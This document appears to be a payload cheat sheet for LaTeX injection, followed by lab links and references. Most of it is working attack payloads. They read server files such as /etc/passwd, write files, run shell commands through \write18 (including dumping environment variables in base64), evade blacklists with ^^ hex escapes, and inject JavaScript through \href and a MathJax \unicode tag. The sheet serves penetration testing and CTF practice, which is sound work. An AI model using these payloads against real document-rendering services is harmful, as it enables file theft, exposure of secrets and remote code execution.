# LaTeX Injection

> LaTeX Injection is a type of injection attack where malicious content is injected into LaTeX documents. LaTeX is widely used for document preparation and typesetting, particularly in academia, for producing high-quality scientific and mathematical documents. Due to its powerful scripting capabilities, LaTeX can be exploited by attackers to execute arbitrary commands if proper safeguards are not in place. 


## Summary

* [File Manipulation](#file-manipulation)
    * [Read File](#read-file)
    * [Write File](#write-file)
* [Command Execution](#command-execution)
* [Cross Site Scripting](#cross-site-scripting)
* [Labs](#labs)
* [References](#references)


## File Manipulation

### Read File

Attackers can read the content of sensitive files on the server.

Read file and interpret the LaTeX code in it:

```tex
\input{/etc/passwd}
\include{somefile} # load .tex file (somefile.tex)
```

Read single lined file:

```tex
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```

Read multiple lined file:

```tex
\lstinputlisting{/etc/passwd}
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

Read text file, **without** interpreting the content, it will only paste raw file content:

```tex
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```

If injection point is past document header (`\usepackage` cannot be used), some control 
characters can be deactivated in order to use `\input` on file containing `$`, `#`, 
`_`, `&`, null bytes, ... (eg. perl scripts).

```tex
\catcode `\$=12
\catcode `\#=12
\catcode `\_=12
\catcode `\&=12
\input{path_to_script.pl}
```

To bypass a blacklist try to replace one character with it's unicode hex value. 
- ^^41 represents a capital A
- ^^7e represents a tilde (~) note that the ‘e’ must be lower case

```tex
\lstin^^70utlisting{/etc/passwd}
```

### Write File

Write single lined file:

```tex
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\write\outfile{Line 2}
\write\outfile{I like trains}
\closeout\outfile
```


## Command Execution

The output of the command will be redirected to stdout, therefore you need to use a temp file to get it.

```tex
\immediate\write18{id > output}
\input{output}
```

If you get any LaTex error, consider using base64 to get the result without bad characters (or use `\verbatiminput`):

```tex
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```tex
\input|ls|base64
\input{|"/bin/hostname"}
```


## Cross Site Scripting

From [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130) 

```tex
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```

In [mathjax](https://docs.mathjax.org/en/latest/input/tex/extensions/unicode.html)

```tex
\unicode{<img src=1 onerror="<ARBITRARY_JS_CODE>">}
```


## Labs

* [Root Me - LaTeX - Input](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Input)
* [Root Me - LaTeX - Command Execution](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Command-execution)


## References

- [Hacking with LaTeX - Sebastian Neef - March 10, 2016](https://0day.work/hacking-with-latex/)
- [Latex to RCE, Private Bug Bounty Program - Yasho - July 6, 2018](https://medium.com/bugbountywriteup/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a)
- [Pwning coworkers thanks to LaTeX - scumjr - November 28, 2016](http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)